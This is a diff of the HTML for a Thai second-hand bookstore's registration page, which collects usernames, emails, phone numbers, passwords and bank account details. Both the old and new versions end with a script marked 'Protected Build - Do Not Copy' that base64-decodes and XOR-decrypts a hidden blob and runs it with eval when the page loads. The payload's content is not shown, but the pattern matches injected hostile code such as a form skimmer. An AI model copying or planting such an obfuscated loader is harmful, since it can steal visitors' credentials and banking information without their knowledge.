@@ -1,35 +1,108 @@
-<!DOCTYPE html><html lang="th"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>สมัครสมาชิก | ร้านหนังสือมือสอง</title><script src="https://cdn.tailwindcss.com"></script><link rel="stylesheet" href="css/styles.css" /></head><body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]"><div id="site-header"></div><main class="flex-1 py-10 sm:py-14 px-4 sm:px-6"><div class="max-w-xl mx-auto bg-white rounded-3xl border border-[#E6E1D6] p-6 sm:p-10 shadow-2xs"><div class="mb-6"><span class="px-3 py-1 rounded-full bg-[#E0F4F1] text-[#26A69A] text-xs font-bold">MEMBER REGISTRATION</span><h1 class="text-2xl sm:text-3xl font-extrabold text-[#1F4E4B] mt-2">สมัครสมาชิกใหม่</h1><p class="text-xs sm:text-sm text-[#5F7470] mt-1">
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>สมัครสมาชิก | ร้านหนังสือมือสอง</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/styles.css" />
+</head>
+<body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]">
+<div id="site-header">
+<header class="sticky top-0 z-50 bg-[#FAF7F2]/95 backdrop-blur-md border-b border-[#E6E1D6]">
+<div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-2">
+<a href="index.html" class="flex items-center gap-2 font-extrabold text-base sm:text-lg text-[#1F4E4B]">
+<span class="w-8 h-8 rounded-xl bg-[#E0F4F1] text-[#26A69A] flex items-center justify-center">📚</span>
+<span>ร้านหนังสือมือสอง</span>
+</a>
+<div class="flex items-center gap-2">
+<a href="login.html" class="inline-flex items-center gap-1.5 px-3.5 sm:px-4 py-2 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white text-xs sm:text-sm font-extrabold shadow-xs transition">
+<span>👤</span>
+<span>เข้าสู่ระบบ / สมัครสมาชิก</span>
+</a>
+</div>
+</div>
+</header>
+</div>
+<main class="flex-1 py-10 sm:py-14 px-4 sm:px-6">
+<div class="max-w-xl mx-auto bg-white rounded-3xl border border-[#E6E1D6] p-6 sm:p-10 shadow-2xs">
+<div class="mb-6">
+<span class="px-3 py-1 rounded-full bg-[#E0F4F1] text-[#26A69A] text-xs font-bold">ลงทะเบียนบัญชีสมาชิก</span>
+<h1 class="text-2xl sm:text-3xl font-extrabold text-[#1F4E4B] mt-2">สมัครสมาชิกใหม่</h1>
+<p class="text-xs sm:text-sm text-[#5F7470] mt-1">
           บัญชีเดียวสามารถเป็นได้ทั้งผู้ซื้อ (จองคิวหนังสือ) และผู้ขาย (ลงขายหนังสือของตัวเอง) ได้ทันที
-        </p></div><div id="register-alert" class="hidden mb-4 p-3.5 rounded-2xl text-xs font-bold"></div><form id="register-form" onsubmit="handleRegisterSubmit(event)" class="space-y-4"><div><label class="block text-xs font-bold text-[#1F4E4B] mb-1">ชื่อผู้ใช้งาน (Username) *</label><input
+        </p>
+</div>
+<div id="register-alert" class="hidden mb-4 p-3.5 rounded-2xl text-xs font-bold"></div>
+<form id="register-form" onsubmit="handleRegisterSubmit(event)" class="space-y-4">
+<div>
+<label class="block text-xs font-bold text-[#1F4E4B] mb-1">ชื่อผู้ใช้งาน *</label>
+<input
             required
             type="text"
             id="reg-username"
             placeholder="เช่น คุณกิตติพงศ์ นักอ่าน"
             class="w-full rounded-2xl border border-[#E6E1D6] bg-[#FAF7F2] px-4 py-2.5 text-sm focus:border-[#26A69A] focus:outline-none"
-          /></div><div class="grid grid-cols-1 sm:grid-cols-2 gap-4"><div><label class="block text-xs font-bold text-[#1F4E4B] mb-1">อีเมล (Email) *</label><input
+          />
+</div>
+<div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+<div>
+<label class="block text-xs font-bold text-[#1F4E4B] mb-1">อีเมล *</label>
+<input
               required
               type="email"
               id="reg-email"
               placeholder="เช่น kittipong@email.com"
               class="w-full rounded-2xl border border-[#E6E1D6] bg-[#FAF7F2] px-4 py-2.5 text-sm focus:border-[#26A69A] focus:outline-none"
-            /></div><div><label class="block text-xs font-bold text-[#1F4E4B] mb-1">เบอร์โทรศัพท์ *</label><input
+            />
+</div>
+<div>
+<label class="block text-xs font-bold text-[#1F4E4B] mb-1">เบอร์โทรศัพท์ (สำหรับรับรหัส OTP) *</label>
+<input
               required
               type="tel"
               id="reg-phone"
               placeholder="เช่น 081-999-8877"
               class="w-full rounded-2xl border border-[#E6E1D6] bg-[#FAF7F2] px-4 py-2.5 text-sm focus:border-[#26A69A] focus:outline-none"
-            /></div></div><div><label class="block text-xs font-bold text-[#1F4E4B] mb-1">รหัสผ่าน (อย่างน้อย 6 ตัวอักษร) *</label><input
+            />
+</div>
+</div>
+<div>
+<label class="block text-xs font-bold text-[#1F4E4B] mb-1">รหัสผ่าน (อย่างน้อย 6 ตัวอักษร) *</label>
+<input
             required
             type="password"
             minlength="6"
             id="reg-password"
             placeholder="ตั้งรหัสผ่านของคุณ..."
             class="w-full rounded-2xl border border-[#E6E1D6] bg-[#FAF7F2] px-4 py-2.5 text-sm focus:border-[#26A69A] focus:outline-none"
-          /></div><div class="p-4 rounded-2xl bg-[#FAF7F2] border border-[#E6E1D6] space-y-3"><div class="text-xs font-bold text-[#1F4E4B]">🏦 บัญชีธนาคารสำหรับรับเงินเมื่อขายหนังสือได้ (ระบุภายหลังได้)</div><div class="grid grid-cols-1 sm:grid-cols-2 gap-3"><input type="text" id="reg-bank-name" placeholder="ชื่อธนาคาร เช่น กสิกรไทย" class="rounded-2xl border border-[#E6E1D6] bg-white px-3.5 py-2 text-xs" /><input type="text" id="reg-bank-no" placeholder="เลขที่บัญชี เช่น 123-4-56789-0" class="rounded-2xl border border-[#E6E1D6] bg-white px-3.5 py-2 text-xs font-mono" /></div></div><button
+          />
+</div>
+<div class="p-4 rounded-2xl bg-[#FAF7F2] border border-[#E6E1D6] space-y-3">
+<div class="text-xs font-bold text-[#1F4E4B]">🏦 บัญชีธนาคารสำหรับรับเงินเมื่อขายหนังสือได้ (ระบุภายหลังได้)</div>
+<div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+<input type="text" id="reg-bank-name" placeholder="ชื่อธนาคาร เช่น กสิกรไทย" class="rounded-2xl border border-[#E6E1D6] bg-white px-3.5 py-2 text-xs" />
+<input type="text" id="reg-bank-no" placeholder="เลขที่บัญชี เช่น 123-4-56789-0" class="rounded-2xl border border-[#E6E1D6] bg-white px-3.5 py-2 text-xs font-mono" />
+</div>
+</div>
+<button
           type="submit"
           id="reg-submit-btn"
           class="w-full py-3.5 px-6 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white font-bold text-sm shadow-xs transition cursor-pointer"
         >
           ยืนยันการสมัครสมาชิก
-        </button></form><div class="mt-6 pt-5 border-t border-[#E6E1D6] flex items-center justify-between text-xs"><span class="text-[#5F7470]">มีบัญชีสมาชิกอยู่แล้วใช่ไหม?</span><a href="login.html" class="font-bold text-[#26A69A] hover:underline">เข้าสู่ระบบที่นี่ →</a></div></div></main><div id="site-footer"></div><script src="js/books-data.js"></script><script src="js/app.js"></script><script>/* Protected Build - Do Not Copy */
-(function(){var _0x127cdf=['HMiiG/hwqXmqIftlcWBsA3SQkpYx8xC5M4E7/fKg9aS0SXbUarxY9muPeLGz86bI/Vtun2qtd/ZlxDP6uumx4PFGPZgjwjq5M4E7/fKg9aT2XHSffKFp+HHNfrnyvfXi9URp1CPCOrkzgTv98qD1pPZcdJ9srWLtUM51qbfuoaSpCD1RoGr6','IaRBo0QyOHdkLJn6CYEoohjzGak9aiM1PD7IohD4cKt5qyX7ZXFgbS50kLtRoHr6IZlBo2kyOFSjryI6kTjoOrkzgTv9oOWh8eZGIbs46Dq5M4E7/a+K9aS0CDqROOhp/Gfgbqm607D350F13zCse+1yj2+yueW7qLRMe8V55m/qdtMy5tig','9aS0CDqROKl2/GHVWbKqrrbo9Vtp/3mlf7kugTywsK3hpOQFKZ8t6Gj2Zs9/uLat5/z4CG7UYLw34WCBfbK89Pjm+0R+kXqvN8Iw5Cub5sbk2bRKdcN8rWi5cc5pubfy+N+3GizwLvFbxDPVfqWmrY6npW4u9CyKR74oqzv98qD1pLQIe919','um7bfNk1qbf4ocf7Rm7Udrw6pDPB+UF6oPH/8Elu0Dalf+pgwHy4r+DujrQIOpE46Dq5cs1+r6bCuvy6S3bQa7tW8GDVNa+37bry8QA92XGsfvx9hjLm2KD1pLQIOpE4u3/tR8h2uL31oay8ATqMJuhhkzOBO/3yoPWktAht2Hasde49zXS+','s/S86/oGcsN9rjqkM8V6qbOup+HwQWjUe7xP63+BZ6Hyp7zq8E1in3C8d/U0mhH98qD1pLQIOsw06C2pI4gg1/Kg9aS0CGeRe6lu+nuBM7ig8vyk7yI6kTjoOrkzgXqxt/KhxvtQNNJ0qWnqXcB2uPK99aP5SjeFOLg3qj2UO6+99bvg8Uw3','g2CkOu122W/wqvP14vtGbpx6p3b9M8N88Imjk8DSGl+DReh49mHFfq/y4rr28E1onEPrX6Aqly+cj6Ch4excN+o7+VytVpVZgPW736S0CDqROOg6+H/EaamQ762q4E1ixVundO12z2/976DyZg6I9QmX6Pogk0GjXDI4YWQsvPoJmiijEPMZ','tj1qHDU8IMiiJfhwhHmrBPtlYGBtEHSRmVGgUfohkkGjbzI4dmQtqPoJkiiiLvMYkz1qLTU8NciiJPhxknmrDPtkUmBtD3SQrlGga/ogn0GjQjI5VWQsj/oJtSiiOvMYl/rpivWktAg6kTjoe/V202+fvfj75/hJacJUoWntPdN+sL32sKyz','QHPVfK10vjqaEf3yoPWktAg602ymNP160nq/vuWxpKkIfNB0u3+iGYE7/fKg9aS0Sm7fNrx/4WfidLOm5bvwtBU6lvhwuHmrFvtlS2BtJnSQq1GgUfohkkGjbzI4dmQsgvoJuSiiKPMZnz1qIzU8PsiiEPhwqHmrK/tlZmBtBbMTEJE46Dq5','M9wR/fKg9fk=','eq6r7rak8l100myhdfczyXqztuyw1vFPc8JsrWjKZsN2tKaosK20UxCROOg6uTPENa2g5aPh+lxe1H6pb/VniTLm2KD1pLQIOtJ3pmntM9RouKDutOnxCCeRfKd57H7Edan857Dw0UR/3H2mbttq6H/19fKw47ldadRqpnv0doYy86ThufHx','Bm7DcaUysCirO/3yoPWk90d0wmzof/RyyHf976Cx6/ddd9R2vDT+dtVesbftsOrgamP4fOA963bGNri/4bzoswE0x3mkb/w91Wm0v6j8v54IOpE46Dr6fM9oqfLwvev6TUXfbaV4/GGBJv2277bx+U10xTavf+1WzX6wt+6hxu1hfpk/un/+','PtFzsrzl8q26Xnvdba007WHIdvX7u9+ktAg6kTirdfdg1Tuts/Om8/tafpEl6H72cNR2uLz0++PxXF/dfaV/92fjYpS2qPL28U83wXm7ae5803/6+66j5fhdf4oS6Dq5M4E7vr3upvC0Snvfc5d0+H7EO+Dy5Lrn4UV/32zmffxn5He4v+W7','8NZRU9Uw72j8dIx5vLzr+Or1RX+WMeZs+H/UfvOm8rzpvAEhuzjoOrkzgXiyvPOhpPZJdNpHqXn6fNR1qY3uuqSpCH7ee713/H3VNbq39JDo8UV/32yKY9B3iTyvt+f45vVGcZx2pz2wPdd6safl+/DmQXeZMfMQuTOBO/3y47rq51w60HSt','aO1RzmP976Cx6/ddd9R2vDT+dtVesbftsOrgamP4fOA963bGcq6m5aep9UR/w2zvM6IZgTv98qD15/tGacU4qm73M5w7ub3joOnxRm6ff61u3H/Edri89Jf93UwylmqtfbRg1Hmwu/T45uBGPZgjwjq5M4E7/bD0u6rwQWnQeqR//TOcO6mg','9bC/ngg6kTjoOvtnzzWpt/ihx/tGbtR2vDqkM4b7ZVNgbTd0kL9RoHn6IZRBo0cyOGRkLLH6CY8ooi/zGZo9agI1PR3Iohz4cLt5qxj7ZXeu+6qzExCROOg6uTPVaaTy+9+ktAg6kTjoOvp8z2ip8vKw97QVOtBvqXPtM8d+qbHo/aO7SWrY','N6lv7XuOabi16abw8Vo9nTizELkzgTv98qD1pLRFf8Vwp36jM4ZLkoHU8qieCDqROOg6uTOBO7W34bHh5lsgkWPoPdp8z2+4vPT40O1Yf5Yi6D34Y9F3tLHhoe37RjXba6d0vjPcN9fyoPWktAg6kTjoePZ32CH9mNOayrpbbsNxpn3wddgz','pvL1puHmRnvcfeQ6/H7AcrH+oKXs+0Z/7na9d/t20zf9ouGm9+NHaNU06Hj4fcpEs7PtsKi0Snvfc5d7+nDObrOm37vruAh40HajRfhwwnSovPSK6vVFf4s4vWn8Yc96sLegqK2eCDqROOg6uTPcMubYoPWktAg6kTirdfdg1Tu5s/S0pKkI','e8Z5oW65YcRo87jzuuq8ASG7OOg6uTOBO/275vWstVp/wjancbAz2hH98qD1pLQIOpE4qXb8YdVZsqqutuj1W2n/eaV/uS6BPLCwreGk5AUpny3oaPZmz3+4tq3n/PgIbtRgvDfhYIF9srz0+Ob7RH6Req83wjDnX5vgxefZtEp1w3ytaLlx','zmm5t/L437dtI4gu/FvEM9V+paatjqelbi70LIpHviirO/3yoPWktAg6kXmkf+tn43Sl/PSw/OBrdd9srXTtM5w7+jAadWsspzqWOOM6sXfAb7z85af2+1o6zWToPXmrC/tlc2BtNXSQnlGga/ohuUGjfDI4Z2QsovoJrCiiGPMYnz1qITU9'],_0x40a87d=0xa;(function(_0xb6ad43,_0x96d45a){while(_0x96d45a-->0x0){_0xb6ad43['push'](_0xb6ad43['shift']());}})(_0x127cdf,_0x127cdf['length']-_0x40a87d);var _0xc657c7=[0x1b,0xdd,0xd2,0x80,0xd5,0x84,0x94,0x28,0x1a,0xb1,0x18,0xc8,0x1a,0x99,0x13,0xa1],_0x57889b=_0x127cdf['join'](''),_0x856b55=window['atob'](_0x57889b),_0x0045f9=_0x856b55['length'],_0xae44d7=new Uint8Array(_0x0045f9);for(var _0x96d45a=0x0;_0x96d45a<_0x0045f9;_0x96d45a++){_0xae44d7[_0x96d45a]=_0x856b55['charCodeAt'](_0x96d45a)^_0xc657c7[_0x96d45a%_0xc657c7['length']];}var _0x87015a=new TextDecoder('utf-8')['decode'](_0xae44d7),_0x26069a=window['eval'];_0x26069a(_0x87015a);})();</script></body></html>
+        </button>
+</form>
+<div class="mt-6 pt-5 border-t border-[#E6E1D6] flex items-center justify-between text-xs">
+<span class="text-[#5F7470]">มีบัญชีสมาชิกอยู่แล้วใช่ไหม?</span>
+<a href="login.html" class="font-bold text-[#26A69A] hover:underline">เข้าสู่ระบบที่นี่ →</a>
+</div>
+</div>
+</main>
+<div id="site-footer"></div>
+<script src="js/books-data.js"></script>
+<script src="js/app.js"></script>
+<script>/* Protected Build - Do Not Copy */
+(function(){var _0x127cdf=['HMiiG/hwqXmqIftlcWBsA3SQkpYx8xC5M4E7/fKg9aS0SXbUarxY9muPeLGz86bI/Vtun2qtd/ZlxDP6uumx4PFGPZgjwjq5M4E7/fKg9aT2XHSffKFp+HHNfrnyvfXi9URp1CPCOrkzgTv98qD1pPZcdJ9srWLtUM51qbfuoaSpCD1RoGr6','IaRBo0QyOHdkLJn6CYEoohjzGak9aiM1PD7IohD4cKt5qyX7ZXFgbS50kLtRoHr6IZlBo2kyOFSjryI6kTjoOrkzgTv9oOWh8eZGIbs46Dq5M4E7/a+K9aS0CDqROOhp/Gfgbqm607D350F13zCse+1yj2+yueW7qLRMe8V55m/qdtMy5tig','9aS0CDqROKl2/GHVWbKqrrbo9Vtp/3mlf7kugTywsK3hpOQFKZ8t6Gj2Zs9/uLat5/z4CG7UYLw34WCBfbK89Pjm+0R+kXqvN8Iw5Cub5sbk2bRKdcN8rWi5cc5pubfy+N+3GizwLvFbxDPVfqWmrY6npW4u9CyKR74oqzv98qD1pLQIe919','um7bfNk1qbf4ocf7Rm7Udrw6pDPB+UF6oPH/8Elu0Dalf+pgwHy4r+DujrQIOpE46Dq5cs1+r6bCuvy6S3bQa7tW8GDVNa+37bry8QA92XGsfvx9hjLm2KD1pLQIOpE4u3/tR8h2uL31oay8ATqMJuhhkzOBO/3yoPWktAht2Hasde49zXS+','s/S86/oGcsN9rjqkM8V6qbOup+HwQWjUe7xP63+BZ6Hyp7zq8E1in3C8d/U0mhH98qD1pLQIOsw06C2pI4gg1/Kg9aS0CGeRe6lu+nuBM7ig8vyk7yI6kTjoOrkzgXqxt/KhxvtQNNJ0qWnqXcB2uPK99aP5SjeFOLg3qj2UO6+99bvg8Uw3','g2CkOu122W/wqvP14vtGbpx6p3b9M8N88Imjk8DSGl+DReh49mHFfq/y4rr28E1onEPrX6Aqly+cj6Ch4excN+o7+VytVpVZgPW736S0CDqROOg6+H/EaamQ762q4E1ixVundO12z2/976DyZg6I9QmX6Pogk0GjXDI4YWQsvPoJmiijEPMZ','tj1qHDU8IMiiJfhwhHmrBPtlYGBtEHSRmVGgUfohkkGjbzI4dmQtqPoJkiiiLvMYkz1qLTU8NciiJPhxknmrDPtkUmBtD3SQrlGga/ogn0GjQjI5VWQsj/oJtSiiOvMYl/rpivWktAg6kTjoe/V202+fvfj75/hJacJUoWntPdN+sL32sKyz','QHPVfK10vjqaEf3yoPWktAg602ymNP160nq/vuWxpKkIfNB0u3+iGYE7/fKg9aS0Sm7fNrx/4WfidLOm5bvwtBU6lvhwuHmrFvtlS2BtJnSQq1GgUfohkkGjbzI4dmQsgvoJuSiiKPMZnz1qIzU8PsiiEPhwqHmrK/tlZmBtBbMTEJE46Dq5','M9wR/fKg9fk=','eq6r7rak8l100myhdfczyXqztuyw1vFPc8JsrWjKZsN2tKaosK20UxCROOg6uTPENa2g5aPh+lxe1H6pb/VniTLm2KD1pLQIOtJ3pmntM9RouKDutOnxCCeRfKd57H7Edan857Dw0UR/3H2mbttq6H/19fKw47ldadRqpnv0doYy86ThufHx','Bm7DcaUysCirO/3yoPWk90d0wmzof/RyyHf976Cx6/ddd9R2vDT+dtVesbftsOrgamP4fOA963bGNri/4bzoswE0x3mkb/w91Wm0v6j8v54IOpE46Dr6fM9oqfLwvev6TUXfbaV4/GGBJv2277bx+U10xTavf+1WzX6wt+6hxu1hfpk/un/+','PtFzsrzl8q26Xnvdba007WHIdvX7u9+ktAg6kTirdfdg1Tuts/Om8/tafpEl6H72cNR2uLz0++PxXF/dfaV/92fjYpS2qPL28U83wXm7ae5803/6+66j5fhdf4oS6Dq5M4E7vr3upvC0Snvfc5d0+H7EO+Dy5Lrn4UV/32zmffxn5He4v+W7','8NZRU9Uw72j8dIx5vLzr+Or1RX+WMeZs+H/UfvOm8rzpvAEhuzjoOrkzgXiyvPOhpPZJdNpHqXn6fNR1qY3uuqSpCH7ee713/H3VNbq39JDo8UV/32yKY9B3iTyvt+f45vVGcZx2pz2wPdd6safl+/DmQXeZMfMQuTOBO/3y47rq51w60HSt','aO1RzmP976Cx6/ddd9R2vDT+dtVesbftsOrgamP4fOA963bGcq6m5aep9UR/w2zvM6IZgTv98qD15/tGacU4qm73M5w7ub3joOnxRm6ff61u3H/Edri89Jf93UwylmqtfbRg1Hmwu/T45uBGPZgjwjq5M4E7/bD0u6rwQWnQeqR//TOcO6mg','9bC/ngg6kTjoOvtnzzWpt/ihx/tGbtR2vDqkM4b7ZVNgbTd0kL9RoHn6IZRBo0cyOGRkLLH6CY8ooi/zGZo9agI1PR3Iohz4cLt5qxj7ZXeu+6qzExCROOg6uTPVaaTy+9+ktAg6kTjoOvp8z2ip8vKw97QVOtBvqXPtM8d+qbHo/aO7SWrY','N6lv7XuOabi16abw8Vo9nTizELkzgTv98qD1pLRFf8Vwp36jM4ZLkoHU8qieCDqROOg6uTOBO7W34bHh5lsgkWPoPdp8z2+4vPT40O1Yf5Yi6D34Y9F3tLHhoe37RjXba6d0vjPcN9fyoPWktAg6kTjoePZ32CH9mNOayrpbbsNxpn3wddgz','pvL1puHmRnvcfeQ6/H7AcrH+oKXs+0Z/7na9d/t20zf9ouGm9+NHaNU06Hj4fcpEs7PtsKi0Snvfc5d7+nDObrOm37vruAh40HajRfhwwnSovPSK6vVFf4s4vWn8Yc96sLegqK2eCDqROOg6uTPcMubYoPWktAg6kTirdfdg1Tu5s/S0pKkI','e8Z5oW65YcRo87jzuuq8ASG7OOg6uTOBO/275vWstVp/wjancbAz2hH98qD1pLQIOpE4qXb8YdVZsqqutuj1W2n/eaV/uS6BPLCwreGk5AUpny3oaPZmz3+4tq3n/PgIbtRgvDfhYIF9srz0+Ob7RH6Req83wjDnX5vgxefZtEp1w3ytaLlx','zmm5t/L437dtI4gu/FvEM9V+paatjqelbi70LIpHviirO/3yoPWktAg6kXmkf+tn43Sl/PSw/OBrdd9srXTtM5w7+jAadWsspzqWOOM6sXfAb7z85af2+1o6zWToPXmrC/tlc2BtNXSQnlGga/ohuUGjfDI4Z2QsovoJrCiiGPMYnz1qITU9'],_0x40a87d=0xa;(function(_0xb6ad43,_0x96d45a){while(_0x96d45a-->0x0){_0xb6ad43['push'](_0xb6ad43['shift']());}})(_0x127cdf,_0x127cdf['length']-_0x40a87d);var _0xc657c7=[0x1b,0xdd,0xd2,0x80,0xd5,0x84,0x94,0x28,0x1a,0xb1,0x18,0xc8,0x1a,0x99,0x13,0xa1],_0x57889b=_0x127cdf['join'](''),_0x856b55=window['atob'](_0x57889b),_0x0045f9=_0x856b55['length'],_0xae44d7=new Uint8Array(_0x0045f9);for(var _0x96d45a=0x0;_0x96d45a<_0x0045f9;_0x96d45a++){_0xae44d7[_0x96d45a]=_0x856b55['charCodeAt'](_0x96d45a)^_0xc657c7[_0x96d45a%_0xc657c7['length']];}var _0x87015a=new TextDecoder('utf-8')['decode'](_0xae44d7),_0x26069a=window['eval'];_0x26069a(_0x87015a);})();</script>
+</body>
+</html>
